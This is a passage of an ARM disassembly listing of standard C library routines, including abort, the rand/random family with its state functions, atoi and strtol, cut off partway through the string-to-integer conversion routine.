   18650:	e59f2084 	ldr	r2, [pc, #132]	; 186dc <__GI_abort+0x120>
   18654:	e7953002 	ldr	r3, [r5, r2]
   18658:	e3530001 	cmp	r3, #1
   1865c:	1a00000e 	bne	1869c <__GI_abort+0xe0>
   18660:	e28d4004 	add	r4, sp, #4
   18664:	e2833001 	add	r3, r3, #1
   18668:	e7853002 	str	r3, [r5, r2]
   1866c:	e1a00004 	mov	r0, r4
   18670:	e3a01000 	mov	r1, #0
   18674:	e3a02014 	mov	r2, #20
   18678:	ebfff894 	bl	168d0 <__GI_memset>
   1867c:	e3e03000 	mvn	r3, #0
   18680:	e1a01004 	mov	r1, r4
   18684:	e3a02000 	mov	r2, #0
   18688:	e3a00006 	mov	r0, #6
   1868c:	e58d3014 	str	r3, [sp, #20]
   18690:	e58d3010 	str	r3, [sp, #16]
   18694:	eb00084a 	bl	1a7c4 <__libc_sigaction>
   18698:	eaffffde 	b	18618 <__GI_abort+0x5c>
   1869c:	e3530002 	cmp	r3, #2
   186a0:	1a000002 	bne	186b0 <__GI_abort+0xf4>
   186a4:	e2833001 	add	r3, r3, #1
   186a8:	e7853002 	str	r3, [r5, r2]
   186ac:	ebffffc2 	bl	185bc <__GI_abort>
   186b0:	e7953002 	ldr	r3, [r5, r2]
   186b4:	e3530003 	cmp	r3, #3
   186b8:	02833001 	addeq	r3, r3, #1
   186bc:	07853002 	streq	r3, [r5, r2]
   186c0:	03a0007f 	moveq	r0, #127	; 0x7f
   186c4:	0b00087d 	bleq	1a8c0 <__GI__exit>
   186c8:	ebffffbb 	bl	185bc <__GI_abort>
   186cc:	eafffffd 	b	186c8 <__GI_abort+0x10c>
   186d0:	000103c8 	.word	0x000103c8
   186d4:	00000100 	.word	0x00000100
   186d8:	00000010 	.word	0x00000010
   186dc:	00000454 	.word	0x00000454
   186e0:	00000044 	.word	0x00000044

000186e4 <rand>:
   186e4:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   186e8:	e24dd004 	sub	sp, sp, #4
   186ec:	eb000002 	bl	186fc <__GI_random>
   186f0:	e28dd004 	add	sp, sp, #4
   186f4:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   186f8:	e12fff1e 	bx	lr

000186fc <__GI_random>:
   186fc:	e92d4070 	push	{r4, r5, r6, lr}
   18700:	e59f407c 	ldr	r4, [pc, #124]	; 18784 <__GI_random+0x88>
   18704:	e59f507c 	ldr	r5, [pc, #124]	; 18788 <__GI_random+0x8c>
   18708:	e24dd018 	sub	sp, sp, #24
   1870c:	e08f4004 	add	r4, pc, r4
   18710:	e59f3074 	ldr	r3, [pc, #116]	; 1878c <__GI_random+0x90>
   18714:	e0845005 	add	r5, r4, r5
   18718:	e28d6004 	add	r6, sp, #4
   1871c:	e7941003 	ldr	r1, [r4, r3]
   18720:	e1a02005 	mov	r2, r5
   18724:	e1a00006 	mov	r0, r6
   18728:	e59f3060 	ldr	r3, [pc, #96]	; 18790 <__GI_random+0x94>
   1872c:	e794c003 	ldr	ip, [r4, r3]
   18730:	e1a0e00f 	mov	lr, pc
   18734:	e12fff1c 	bx	ip
   18738:	e59f3054 	ldr	r3, [pc, #84]	; 18794 <__GI_random+0x98>
   1873c:	e1a00005 	mov	r0, r5
   18740:	e794c003 	ldr	ip, [r4, r3]
   18744:	e1a0e00f 	mov	lr, pc
   18748:	e12fff1c 	bx	ip
   1874c:	e59f0044 	ldr	r0, [pc, #68]	; 18798 <__GI_random+0x9c>
   18750:	e28d1014 	add	r1, sp, #20
   18754:	e0840000 	add	r0, r4, r0
   18758:	eb000097 	bl	189bc <__GI_random_r>
   1875c:	e1a00006 	mov	r0, r6
   18760:	e3a01001 	mov	r1, #1
   18764:	e59f3030 	ldr	r3, [pc, #48]	; 1879c <__GI_random+0xa0>
   18768:	e794c003 	ldr	ip, [r4, r3]
   1876c:	e1a0e00f 	mov	lr, pc
   18770:	e12fff1c 	bx	ip
   18774:	e59d0014 	ldr	r0, [sp, #20]
   18778:	e28dd018 	add	sp, sp, #24
   1877c:	e8bd4070 	pop	{r4, r5, r6, lr}
   18780:	e12fff1e 	bx	lr
   18784:	00010280 	.word	0x00010280
   18788:	00000118 	.word	0x00000118
   1878c:	00000044 	.word	0x00000044
   18790:	00000070 	.word	0x00000070
   18794:	00000010 	.word	0x00000010
   18798:	000001b0 	.word	0x000001b0
   1879c:	0000002c 	.word	0x0000002c

000187a0 <setstate>:
   187a0:	e92d4070 	push	{r4, r5, r6, lr}
   187a4:	e59f6090 	ldr	r6, [pc, #144]	; 1883c <setstate+0x9c>
   187a8:	e59f4090 	ldr	r4, [pc, #144]	; 18840 <setstate+0xa0>
   187ac:	e08f6006 	add	r6, pc, r6
   187b0:	e59f308c 	ldr	r3, [pc, #140]	; 18844 <setstate+0xa4>
   187b4:	e24dd010 	sub	sp, sp, #16
   187b8:	e0864004 	add	r4, r6, r4
   187bc:	e1a02004 	mov	r2, r4
   187c0:	e7961003 	ldr	r1, [r6, r3]
   187c4:	e1a05000 	mov	r5, r0
   187c8:	e59f3078 	ldr	r3, [pc, #120]	; 18848 <setstate+0xa8>
   187cc:	e1a0000d 	mov	r0, sp
   187d0:	e796c003 	ldr	ip, [r6, r3]
   187d4:	e1a0e00f 	mov	lr, pc
   187d8:	e12fff1c 	bx	ip
   187dc:	e1a00004 	mov	r0, r4
   187e0:	e59f3064 	ldr	r3, [pc, #100]	; 1884c <setstate+0xac>
   187e4:	e796c003 	ldr	ip, [r6, r3]
   187e8:	e1a0e00f 	mov	lr, pc
   187ec:	e12fff1c 	bx	ip
   187f0:	e59f3058 	ldr	r3, [pc, #88]	; 18850 <setstate+0xb0>
   187f4:	e0863003 	add	r3, r6, r3
   187f8:	e1a01003 	mov	r1, r3
   187fc:	e1a00005 	mov	r0, r5
   18800:	e5934008 	ldr	r4, [r3, #8]
   18804:	eb000104 	bl	18c1c <__GI_setstate_r>
   18808:	e3a01001 	mov	r1, #1
   1880c:	e3500000 	cmp	r0, #0
   18810:	e59f303c 	ldr	r3, [pc, #60]	; 18854 <setstate+0xb4>
   18814:	e1a0000d 	mov	r0, sp
   18818:	b3a04000 	movlt	r4, #0
   1881c:	a2444004 	subge	r4, r4, #4
   18820:	e796c003 	ldr	ip, [r6, r3]
   18824:	e1a0e00f 	mov	lr, pc
   18828:	e12fff1c 	bx	ip
   1882c:	e1a00004 	mov	r0, r4
   18830:	e28dd010 	add	sp, sp, #16
   18834:	e8bd4070 	pop	{r4, r5, r6, lr}
   18838:	e12fff1e 	bx	lr
   1883c:	000101e0 	.word	0x000101e0
   18840:	00000118 	.word	0x00000118
   18844:	00000044 	.word	0x00000044
   18848:	00000070 	.word	0x00000070
   1884c:	00000010 	.word	0x00000010
   18850:	000001b0 	.word	0x000001b0
   18854:	0000002c 	.word	0x0000002c

00018858 <initstate>:
   18858:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   1885c:	e59f4098 	ldr	r4, [pc, #152]	; 188fc <initstate+0xa4>
   18860:	e59f5098 	ldr	r5, [pc, #152]	; 18900 <initstate+0xa8>
   18864:	e08f4004 	add	r4, pc, r4
   18868:	e59f3094 	ldr	r3, [pc, #148]	; 18904 <initstate+0xac>
   1886c:	e24dd014 	sub	sp, sp, #20
   18870:	e0845005 	add	r5, r4, r5
   18874:	e1a0a000 	mov	sl, r0
   18878:	e1a06001 	mov	r6, r1
   1887c:	e1a07002 	mov	r7, r2
   18880:	e7941003 	ldr	r1, [r4, r3]
   18884:	e1a02005 	mov	r2, r5
   18888:	e1a0000d 	mov	r0, sp
   1888c:	e59f3074 	ldr	r3, [pc, #116]	; 18908 <initstate+0xb0>
   18890:	e794c003 	ldr	ip, [r4, r3]
   18894:	e1a0e00f 	mov	lr, pc
   18898:	e12fff1c 	bx	ip
   1889c:	e1a00005 	mov	r0, r5
   188a0:	e59f3064 	ldr	r3, [pc, #100]	; 1890c <initstate+0xb4>
   188a4:	e794c003 	ldr	ip, [r4, r3]
   188a8:	e1a0e00f 	mov	lr, pc
   188ac:	e12fff1c 	bx	ip
   188b0:	e59f3058 	ldr	r3, [pc, #88]	; 18910 <initstate+0xb8>
   188b4:	e1a01006 	mov	r1, r6
   188b8:	e0843003 	add	r3, r4, r3
   188bc:	e1a02007 	mov	r2, r7
   188c0:	e1a0000a 	mov	r0, sl
   188c4:	e5935008 	ldr	r5, [r3, #8]
   188c8:	eb000095 	bl	18b24 <__GI_initstate_r>
   188cc:	e1a0000d 	mov	r0, sp
   188d0:	e3a01001 	mov	r1, #1
   188d4:	e59f3038 	ldr	r3, [pc, #56]	; 18914 <initstate+0xbc>
   188d8:	e794c003 	ldr	ip, [r4, r3]
   188dc:	e1a0e00f 	mov	lr, pc
   188e0:	e12fff1c 	bx	ip
   188e4:	e2455004 	sub	r5, r5, #4
   188e8:	e1a0800d 	mov	r8, sp
   188ec:	e1a00005 	mov	r0, r5
   188f0:	e28dd014 	add	sp, sp, #20
   188f4:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   188f8:	e12fff1e 	bx	lr
   188fc:	00010128 	.word	0x00010128
   18900:	00000118 	.word	0x00000118
   18904:	00000044 	.word	0x00000044
   18908:	00000070 	.word	0x00000070
   1890c:	00000010 	.word	0x00000010
   18910:	000001b0 	.word	0x000001b0
   18914:	0000002c 	.word	0x0000002c

00018918 <srand>:
   18918:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   1891c:	e59f407c 	ldr	r4, [pc, #124]	; 189a0 <srand+0x88>
   18920:	e59f507c 	ldr	r5, [pc, #124]	; 189a4 <srand+0x8c>
   18924:	e08f4004 	add	r4, pc, r4
   18928:	e59f3078 	ldr	r3, [pc, #120]	; 189a8 <srand+0x90>
   1892c:	e24dd014 	sub	sp, sp, #20
   18930:	e0845005 	add	r5, r4, r5
   18934:	e7941003 	ldr	r1, [r4, r3]
   18938:	e1a02005 	mov	r2, r5
   1893c:	e1a06000 	mov	r6, r0
   18940:	e59f3064 	ldr	r3, [pc, #100]	; 189ac <srand+0x94>
   18944:	e1a0000d 	mov	r0, sp
   18948:	e794c003 	ldr	ip, [r4, r3]
   1894c:	e1a0e00f 	mov	lr, pc
   18950:	e12fff1c 	bx	ip
   18954:	e59f3054 	ldr	r3, [pc, #84]	; 189b0 <srand+0x98>
   18958:	e1a00005 	mov	r0, r5
   1895c:	e794c003 	ldr	ip, [r4, r3]
   18960:	e1a0e00f 	mov	lr, pc
   18964:	e12fff1c 	bx	ip
   18968:	e59f1044 	ldr	r1, [pc, #68]	; 189b4 <srand+0x9c>
   1896c:	e1a00006 	mov	r0, r6
   18970:	e0841001 	add	r1, r4, r1
   18974:	eb000034 	bl	18a4c <__GI_srandom_r>
   18978:	e1a0000d 	mov	r0, sp
   1897c:	e3a01001 	mov	r1, #1
   18980:	e59f3030 	ldr	r3, [pc, #48]	; 189b8 <srand+0xa0>
   18984:	e1a0700d 	mov	r7, sp
   18988:	e794c003 	ldr	ip, [r4, r3]
   1898c:	e1a0e00f 	mov	lr, pc
   18990:	e12fff1c 	bx	ip
   18994:	e28dd014 	add	sp, sp, #20
   18998:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   1899c:	e12fff1e 	bx	lr
   189a0:	00010068 	.word	0x00010068
   189a4:	00000118 	.word	0x00000118
   189a8:	00000044 	.word	0x00000044
   189ac:	00000070 	.word	0x00000070
   189b0:	00000010 	.word	0x00000010
   189b4:	000001b0 	.word	0x000001b0
   189b8:	0000002c 	.word	0x0000002c

000189bc <__GI_random_r>:
   189bc:	e92d4010 	push	{r4, lr}
   189c0:	e1d030dc 	ldrsb	r3, [r0, #12]
   189c4:	e3530000 	cmp	r3, #0
   189c8:	e1a0c000 	mov	ip, r0
   189cc:	e1a04001 	mov	r4, r1
   189d0:	e590e008 	ldr	lr, [r0, #8]
   189d4:	1a000008 	bne	189fc <__GI_random_r+0x40>
   189d8:	e59e2000 	ldr	r2, [lr]
   189dc:	e59f3064 	ldr	r3, [pc, #100]	; 18a48 <__GI_random_r+0x8c>
   189e0:	e0030392 	mul	r3, r2, r3
   189e4:	e2833a03 	add	r3, r3, #12288	; 0x3000
   189e8:	e2833039 	add	r3, r3, #57	; 0x39
   189ec:	e3c33102 	bic	r3, r3, #-2147483648	; 0x80000000
   189f0:	e58e3000 	str	r3, [lr]
   189f4:	e5813000 	str	r3, [r1]
   189f8:	ea00000f 	b	18a3c <__GI_random_r+0x80>
   189fc:	e5902000 	ldr	r2, [r0]
   18a00:	e5900004 	ldr	r0, [r0, #4]
   18a04:	e5921000 	ldr	r1, [r2]
   18a08:	e4903004 	ldr	r3, [r0], #4
   18a0c:	e0833001 	add	r3, r3, r1
   18a10:	e4823004 	str	r3, [r2], #4
   18a14:	e59c1010 	ldr	r1, [ip, #16]
   18a18:	e1a030a3 	lsr	r3, r3, #1
   18a1c:	e1520001 	cmp	r2, r1
   18a20:	e5843000 	str	r3, [r4]
   18a24:	21a0200e 	movcs	r2, lr
   18a28:	2a000001 	bcs	18a34 <__GI_random_r+0x78>
   18a2c:	e1500001 	cmp	r0, r1
   18a30:	21a0000e 	movcs	r0, lr
   18a34:	e58c0004 	str	r0, [ip, #4]
   18a38:	e58c2000 	str	r2, [ip]
   18a3c:	e3a00000 	mov	r0, #0
   18a40:	e8bd4010 	pop	{r4, lr}
   18a44:	e12fff1e 	bx	lr
   18a48:	41c64e6d 	.word	0x41c64e6d

00018a4c <__GI_srandom_r>:
   18a4c:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   18a50:	e1d130dc 	ldrsb	r3, [r1, #12]
   18a54:	e3530004 	cmp	r3, #4
   18a58:	e24dd00c 	sub	sp, sp, #12
   18a5c:	e1a05001 	mov	r5, r1
   18a60:	e5d1300c 	ldrb	r3, [r1, #12]
   18a64:	83e00000 	mvnhi	r0, #0
   18a68:	8a000027 	bhi	18b0c <__GI_srandom_r+0xc0>
   18a6c:	e3500000 	cmp	r0, #0
   18a70:	e5916008 	ldr	r6, [r1, #8]
   18a74:	03a00001 	moveq	r0, #1
   18a78:	e3530000 	cmp	r3, #0
   18a7c:	e5860000 	str	r0, [r6]
   18a80:	0a000020 	beq	18b08 <__GI_srandom_r+0xbc>
   18a84:	e1d1a0dd 	ldrsb	sl, [r1, #13]
   18a88:	e59fb088 	ldr	fp, [pc, #136]	; 18b18 <__GI_srandom_r+0xcc>
   18a8c:	e59f9088 	ldr	r9, [pc, #136]	; 18b1c <__GI_srandom_r+0xd0>
   18a90:	e1a04000 	mov	r4, r0
   18a94:	e1a08006 	mov	r8, r6
   18a98:	e3a07001 	mov	r7, #1
   18a9c:	ea000008 	b	18ac4 <__GI_srandom_r+0x78>
   18aa0:	ebfff512 	bl	15ef0 <__aeabi_idivmod>
   18aa4:	e1a00004 	mov	r0, r4
   18aa8:	e0040b91 	mul	r4, r1, fp
   18aac:	e59f106c 	ldr	r1, [pc, #108]	; 18b20 <__GI_srandom_r+0xd4>
   18ab0:	ebfff4c3 	bl	15dc4 <__divsi3>
   18ab4:	e0030990 	mul	r3, r0, r9
   18ab8:	e0544003 	subs	r4, r4, r3
   18abc:	42444106 	submi	r4, r4, #-2147483647	; 0x80000001
   18ac0:	e5a84004 	str	r4, [r8, #4]!
   18ac4:	e157000a 	cmp	r7, sl
   18ac8:	e1a00004 	mov	r0, r4
   18acc:	e59f104c 	ldr	r1, [pc, #76]	; 18b20 <__GI_srandom_r+0xd4>
   18ad0:	e2877001 	add	r7, r7, #1
   18ad4:	bafffff1 	blt	18aa0 <__GI_srandom_r+0x54>
   18ad8:	e3a0300a 	mov	r3, #10
   18adc:	e004039a 	mul	r4, sl, r3
   18ae0:	e1d530de 	ldrsb	r3, [r5, #14]
   18ae4:	e28d7004 	add	r7, sp, #4
   18ae8:	e0863103 	add	r3, r6, r3, lsl #2
   18aec:	e8850048 	stm	r5, {r3, r6}
   18af0:	ea000000 	b	18af8 <__GI_srandom_r+0xac>
   18af4:	ebffffb0 	bl	189bc <__GI_random_r>
   18af8:	e2544001 	subs	r4, r4, #1
   18afc:	e1a00005 	mov	r0, r5
   18b00:	e1a01007 	mov	r1, r7
   18b04:	5afffffa 	bpl	18af4 <__GI_srandom_r+0xa8>
   18b08:	e3a00000 	mov	r0, #0
   18b0c:	e28dd00c 	add	sp, sp, #12
   18b10:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   18b14:	e12fff1e 	bx	lr
   18b18:	000041a7 	.word	0x000041a7
   18b1c:	00000b14 	.word	0x00000b14
   18b20:	0001f31d 	.word	0x0001f31d

00018b24 <__GI_initstate_r>:
   18b24:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   18b28:	e59fc0dc 	ldr	ip, [pc, #220]	; 18c0c <__GI_initstate_r+0xe8>
   18b2c:	e352007f 	cmp	r2, #127	; 0x7f
   18b30:	e08fc00c 	add	ip, pc, ip
   18b34:	e24dd004 	sub	sp, sp, #4
   18b38:	e1a07001 	mov	r7, r1
   18b3c:	e1a05003 	mov	r5, r3
   18b40:	9a000003 	bls	18b54 <__GI_initstate_r+0x30>
   18b44:	e35200ff 	cmp	r2, #255	; 0xff
   18b48:	83a04004 	movhi	r4, #4
   18b4c:	93a04003 	movls	r4, #3
   18b50:	ea000008 	b	18b78 <__GI_initstate_r+0x54>
   18b54:	e352001f 	cmp	r2, #31
   18b58:	8a000003 	bhi	18b6c <__GI_initstate_r+0x48>
   18b5c:	e3520007 	cmp	r2, #7
   18b60:	83a04000 	movhi	r4, #0
   18b64:	8a000003 	bhi	18b78 <__GI_initstate_r+0x54>
   18b68:	ea00001b 	b	18bdc <__GI_initstate_r+0xb8>
   18b6c:	e352003f 	cmp	r2, #63	; 0x3f
   18b70:	83a04002 	movhi	r4, #2
   18b74:	93a04001 	movls	r4, #1
   18b78:	e59f3090 	ldr	r3, [pc, #144]	; 18c10 <__GI_initstate_r+0xec>
   18b7c:	e08c3003 	add	r3, ip, r3
   18b80:	e0832104 	add	r2, r3, r4, lsl #2
   18b84:	e5921014 	ldr	r1, [r2, #20]
   18b88:	e2876004 	add	r6, r7, #4
   18b8c:	e7932104 	ldr	r2, [r3, r4, lsl #2]
   18b90:	e0863101 	add	r3, r6, r1, lsl #2
   18b94:	e5853010 	str	r3, [r5, #16]
   18b98:	e5c5200e 	strb	r2, [r5, #14]
   18b9c:	e5c5100d 	strb	r1, [r5, #13]
   18ba0:	e5c5400c 	strb	r4, [r5, #12]
   18ba4:	e5856008 	str	r6, [r5, #8]
   18ba8:	e1a01005 	mov	r1, r5
   18bac:	ebffffa6 	bl	18a4c <__GI_srandom_r>
   18bb0:	e3540000 	cmp	r4, #0
   18bb4:	15953004 	ldrne	r3, [r5, #4]
   18bb8:	10663003 	rsbne	r3, r6, r3
   18bbc:	11a03143 	asrne	r3, r3, #2
   18bc0:	13a02005 	movne	r2, #5
   18bc4:	10234392 	mlane	r3, r2, r3, r4
   18bc8:	e3a00000 	mov	r0, #0
   18bcc:	e5870000 	str	r0, [r7]
   18bd0:	01a00004 	moveq	r0, r4
   18bd4:	15873000 	strne	r3, [r7]
   18bd8:	ea000008 	b	18c00 <__GI_initstate_r+0xdc>
   18bdc:	e59f3030 	ldr	r3, [pc, #48]	; 18c14 <__GI_initstate_r+0xf0>
   18be0:	eb000722 	bl	1a870 <__aeabi_read_tp>
   18be4:	e79f3003 	ldr	r3, [pc, r3]
   18be8:	e3a02016 	mov	r2, #22
   18bec:	e7802003 	str	r2, [r0, r3]
   18bf0:	e59f3020 	ldr	r3, [pc, #32]	; 18c18 <__GI_initstate_r+0xf4>
   18bf4:	e79f3003 	ldr	r3, [pc, r3]
   18bf8:	e7802003 	str	r2, [r0, r3]
   18bfc:	e3e00000 	mvn	r0, #0
   18c00:	e28dd004 	add	sp, sp, #4
   18c04:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   18c08:	e12fff1e 	bx	lr
   18c0c:	0000fe5c 	.word	0x0000fe5c
   18c10:	ffff7b00 	.word	0xffff7b00
   18c14:	0000fe00 	.word	0x0000fe00
   18c18:	0000fdf0 	.word	0x0000fdf0

00018c1c <__GI_setstate_r>:
   18c1c:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   18c20:	e1a04001 	mov	r4, r1
   18c24:	e5d1100c 	ldrb	r1, [r1, #12]
   18c28:	e3510000 	cmp	r1, #0
   18c2c:	15943004 	ldrne	r3, [r4, #4]
   18c30:	e2806004 	add	r6, r0, #4
   18c34:	e5940008 	ldr	r0, [r4, #8]
   18c38:	11a01c01 	lslne	r1, r1, #24
   18c3c:	10603003 	rsbne	r3, r0, r3
   18c40:	11a03143 	asrne	r3, r3, #2
   18c44:	11a01c41 	asrne	r1, r1, #24
   18c48:	13a02005 	movne	r2, #5
   18c4c:	10231392 	mlane	r3, r2, r3, r1
   18c50:	05001004 	streq	r1, [r0, #-4]
   18c54:	15003004 	strne	r3, [r0, #-4]
   18c58:	e5168004 	ldr	r8, [r6, #-4]
   18c5c:	e3a01005 	mov	r1, #5
   18c60:	e1a00008 	mov	r0, r8
   18c64:	ebfff4a1 	bl	15ef0 <__aeabi_idivmod>
   18c68:	e59f508c 	ldr	r5, [pc, #140]	; 18cfc <__GI_setstate_r+0xe0>
   18c6c:	e3510004 	cmp	r1, #4
   18c70:	e08f5005 	add	r5, pc, r5
   18c74:	8a000018 	bhi	18cdc <__GI_setstate_r+0xc0>
   18c78:	e59f3080 	ldr	r3, [pc, #128]	; 18d00 <__GI_setstate_r+0xe4>
   18c7c:	e0853003 	add	r3, r5, r3
   18c80:	e0832101 	add	r2, r3, r1, lsl #2
   18c84:	e5925014 	ldr	r5, [r2, #20]
   18c88:	e7937101 	ldr	r7, [r3, r1, lsl #2]
   18c8c:	e3510000 	cmp	r1, #0
   18c90:	e5c4500d 	strb	r5, [r4, #13]
   18c94:	e5c4700e 	strb	r7, [r4, #14]
   18c98:	e5c4100c 	strb	r1, [r4, #12]
   18c9c:	0a000009 	beq	18cc8 <__GI_setstate_r+0xac>
   18ca0:	e3a01005 	mov	r1, #5
   18ca4:	e1a00008 	mov	r0, r8
   18ca8:	ebfff445 	bl	15dc4 <__divsi3>
   18cac:	e0863100 	add	r3, r6, r0, lsl #2
   18cb0:	e5843004 	str	r3, [r4, #4]
   18cb4:	e0870000 	add	r0, r7, r0
   18cb8:	e1a01005 	mov	r1, r5
   18cbc:	ebfff48b 	bl	15ef0 <__aeabi_idivmod>
   18cc0:	e0861101 	add	r1, r6, r1, lsl #2
   18cc4:	e5841000 	str	r1, [r4]
   18cc8:	e0863105 	add	r3, r6, r5, lsl #2
   18ccc:	e3a00000 	mov	r0, #0
   18cd0:	e5843010 	str	r3, [r4, #16]
   18cd4:	e5846008 	str	r6, [r4, #8]
   18cd8:	ea000005 	b	18cf4 <__GI_setstate_r+0xd8>
   18cdc:	e59f3020 	ldr	r3, [pc, #32]	; 18d04 <__GI_setstate_r+0xe8>
   18ce0:	eb0006e2 	bl	1a870 <__aeabi_read_tp>
   18ce4:	e79f3003 	ldr	r3, [pc, r3]
   18ce8:	e3a02016 	mov	r2, #22
   18cec:	e7802003 	str	r2, [r0, r3]
   18cf0:	e3e00000 	mvn	r0, #0
   18cf4:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   18cf8:	e12fff1e 	bx	lr
   18cfc:	0000fd1c 	.word	0x0000fd1c
   18d00:	ffff7b00 	.word	0xffff7b00
   18d04:	0000fd00 	.word	0x0000fd00

00018d08 <__GI_atoi>:
   18d08:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   18d0c:	e3a01000 	mov	r1, #0
   18d10:	e24dd004 	sub	sp, sp, #4
   18d14:	e3a0200a 	mov	r2, #10
   18d18:	eb000002 	bl	18d28 <__GI_strtol>
   18d1c:	e28dd004 	add	sp, sp, #4
   18d20:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   18d24:	e12fff1e 	bx	lr

00018d28 <__GI_strtol>:
   18d28:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   18d2c:	e3a03001 	mov	r3, #1
   18d30:	e24dd004 	sub	sp, sp, #4
   18d34:	eb000002 	bl	18d44 <_stdlib_strto_l>
   18d38:	e28dd004 	add	sp, sp, #4
   18d3c:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   18d40:	e12fff1e 	bx	lr

00018d44 <_stdlib_strto_l>:
   18d44:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   18d48:	e59fc1bc 	ldr	ip, [pc, #444]	; 18f0c <_stdlib_strto_l+0x1c8>
   18d4c:	e59fe1bc 	ldr	lr, [pc, #444]	; 18f10 <_stdlib_strto_l+0x1cc>
   18d50:	e24dd00c 	sub	sp, sp, #12
   18d54:	e08fc00c 	add	ip, pc, ip
   18d58:	e1a09001 	mov	r9, r1
   18d5c:	e1a05002 	mov	r5, r2
   18d60:	e1a04000 	mov	r4, r0
   18d64:	e58d3004 	str	r3, [sp, #4]
   18d68:	ea000000 	b	18d70 <_stdlib_strto_l+0x2c>
   18d6c:	e2844001 	add	r4, r4, #1
   18d70:	e5d41000 	ldrb	r1, [r4]
   18d74:	e79c200e 	ldr	r2, [ip, lr]
   18d78:	e1a03081 	lsl	r3, r1, #1
   18d7c:	e19330b2 	ldrh	r3, [r3, r2]
   18d80:	e2133020 	ands	r3, r3, #32
   18d84:	1afffff8 	bne	18d6c <_stdlib_strto_l+0x28>
   18d88:	e351002b 	cmp	r1, #43	; 0x2b
   18d8c:	0a000004 	beq	18da4 <_stdlib_strto_l+0x60>
   18d90:	e351002d 	cmp	r1, #45	; 0x2d
   18d94:	11a07003 	movne	r7, r3
   18d98:	03a07001 	moveq	r7, #1
   18d9c:	0a000001 	beq	18da8 <_stdlib_strto_l+0x64>
   18da0:	ea000001 	b	18dac <_stdlib_strto_l+0x68>
   18da4:	e1a07003 	mov	r7, r3
   18da8:	e2844001 	add	r4, r4, #1
   18dac:	e3d52010 	bics	r2, r5, #16
   18db0:	11a06000 	movne	r6, r0
   18db4:	1a00000e 	bne	18df4 <_stdlib_strto_l+0xb0>
   18db8:	e5d43000 	ldrb	r3, [r4]
   18dbc:	e3530030 	cmp	r3, #48	; 0x30
   18dc0:	e285500a 	add	r5, r5, #10
   18dc4:	11a06000 	movne	r6, r0
   18dc8:	1a000007 	bne	18dec <_stdlib_strto_l+0xa8>
   18dcc:	e5f43001 	ldrb	r3, [r4, #1]!
   18dd0:	e3833020 	orr	r3, r3, #32
   18dd4:	e3530078 	cmp	r3, #120	; 0x78
   18dd8:	e2455002 	sub	r5, r5, #2
   18ddc:	01a06004 	moveq	r6, r4
   18de0:	11a06004 	movne	r6, r4
   18de4:	01a05085 	lsleq	r5, r5, #1
   18de8:	02844001 	addeq	r4, r4, #1
   18dec:	e3550010 	cmp	r5, #16
   18df0:	a3a05010 	movge	r5, #16
   18df4:	e2453002 	sub	r3, r5, #2
   18df8:	e3530022 	cmp	r3, #34	; 0x22
   18dfc:	83a0c000 	movhi	ip, #0
   18e00:	8a00002c 	bhi	18eb8 <_stdlib_strto_l+0x174>
   18e04:	e3e00000 	mvn	r0, #0
   18e08:	e1a01005 	mov	r1, r5
   18e0c:	ebfff3e6 	bl	15dac <__aeabi_uidivmod>
   18e10:	e3e00000 	mvn	r0, #0
   18e14:	e1a03001 	mov	r3, r1
   18e18:	e1a01005 	mov	r1, r5
   18e1c:	e203a0ff 	and	sl, r3, #255	; 0xff
   18e20:	ebfff3a2 	bl	15cb0 <__udivsi3>
   18e24:	e3e0b000 	mvn	fp, #0
   18e28:	e1a08000 	mov	r8, r0
   18e2c:	e3a0c000 	mov	ip, #0
   18e30:	ea000000 	b	18e38 <_stdlib_strto_l+0xf4>
   18e34:	e1a06004 	mov	r6, r4
   18e38:	e5d42000 	ldrb	r2, [r4]
   18e3c:	e2423030 	sub	r3, r2, #48	; 0x30
   18e40:	e20310ff 	and	r1, r3, #255	; 0xff
   18e44:	e3510009 	cmp	r1, #9
   18e48:	e3822020 	orr	r2, r2, #32
   18e4c:	9a000003 	bls	18e60 <_stdlib_strto_l+0x11c>
   18e50:	e3520060 	cmp	r2, #96	; 0x60
   18e54:	e2422057 	sub	r2, r2, #87	; 0x57
   18e58:	e3a01028 	mov	r1, #40	; 0x28
   18e5c:	820210ff 	andhi	r1, r2, #255	; 0xff
   18e60:	e1510005 	cmp	r1, r5
   18e64:	aa000013 	bge	18eb8 <_stdlib_strto_l+0x174>
   18e68:	e15c0008 	cmp	ip, r8
   18e6c:	13a03000 	movne	r3, #0
   18e70:	03a03001 	moveq	r3, #1
   18e74:	e2844001 	add	r4, r4, #1
   18e78:	8a000005 	bhi	18e94 <_stdlib_strto_l+0x150>
   18e7c:	e151000a 	cmp	r1, sl
   18e80:	93a03000 	movls	r3, #0
   18e84:	82033001 	andhi	r3, r3, #1
   18e88:	e3530000 	cmp	r3, #0
   18e8c:	002c1c95 	mlaeq	ip, r5, ip, r1
   18e90:	0affffe7 	beq	18e34 <_stdlib_strto_l+0xf0>
   18e94:	e59d3004 	ldr	r3, [sp, #4]
   18e98:	e59f2074 	ldr	r2, [pc, #116]	; 18f14 <_stdlib_strto_l+0x1d0>
   18e9c:	eb000673 	bl	1a870 <__aeabi_read_tp>
   18ea0:	e0077003 	and	r7, r7, r3
   18ea4:	e1a0c00b 	mov	ip, fp
   18ea8:	e79f3002 	ldr	r3, [pc, r2]
   18eac:	e3a02022 	mov	r2, #34	; 0x22
   18eb0:	e7802003 	str	r2, [r0, r3]
   18eb4:	eaffffde 	b	18e34 <_stdlib_strto_l+0xf0>
   18eb8:	e3590000 	cmp	r9, #0
   18ebc:	15896000 	strne	r6, [r9]
